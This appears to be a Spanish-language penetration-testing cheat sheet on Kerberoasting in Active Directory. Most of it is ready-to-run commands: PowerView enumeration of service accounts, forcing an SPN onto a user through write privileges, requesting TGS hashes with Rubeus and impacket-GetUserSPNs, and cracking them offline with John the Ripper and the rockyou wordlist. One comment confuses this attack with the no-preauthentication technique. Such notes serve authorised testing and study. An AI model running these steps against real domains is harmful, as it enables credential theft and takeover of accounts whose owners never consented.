# TGS-REP Roasting (Kerberoasting) Attack 

Tags: #AD #Kerberoasting #PowerView #JohnTheRipper #Impacket 

## Identificar usuarios con servicios

```powershell
# Utilizar PowerView 
❯ Get-NetComputer -Identity WS01   # Mirar su info en donde se encuentra el ServicePrincipalName (SPN) que muestra los servicios que ofrece el objeto 

❯ Get-NetUser -Identity krbtgt     # Observar los servicios asociados en su SPN  
```

```powershell 
# Utilizar PowerView 
❯ Get-NetUser -SPN     # Mirar los usuarios que están ofreciendo un servicio 
❯ Get-NetUser -SPN | select name,serviceprincipalname 
```

## ACL - WriteALL (Forzar un kerberoasting)


Esto se puede hacer cuando un usuario tiene el privilegio de 'GenericAll, GenericWrite' sobre otro usuario se puede asociar un SPN de manera remota sobre el segundo usuario

```powershell 
# Utilizar Powershell para que el usuario que tiene privilegios 'WriteAll' sobre 'user2' pueda colocarle la no preautenticación 
❯ Set-DomainObject -Identity user2 -Set @{serviceprincipalname='test/cualquiercosa'} -Verbose 
```

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

# Se necesita mínimo un usuario sin privilegios dentro del dominio para poder hacer el ataque 
❯ .\Rubeus.exe kerberoast    # Ejecutar el ataque sin indicar algún formato
❯ .\Rubeus.exe kerberoast /format:john /outfile:hash.john   # Ataque Kerberoasting y obtener el hash de algún usuario que no tenga la preautenticación para despúes crackearlo offline
```

## Impacket - Kali 

Ejecutar el ataque de Kerberoasting con la herramienta impacket desde Kali.

```bash 
# Se necesita mínimo un usuario sin privilegios dentro del dominio para poder hacer el ataque
❯ impacket-GetUserSPNs domain/user1:password1 -request    # Solcitar un TGS  

❯ impacket-GetUserSPNs domain/user1:password1 -outputfile kerb.hash 
```

## Crackear el hash con John 

```bash 
❯ john kerb.hash   # Crackear el hash para obtener la password 
❯ john kerb.hash -w /usr/share/wordlist/rockyou.txt 
❯ john kerb.hash --show  # Mirar la password 
```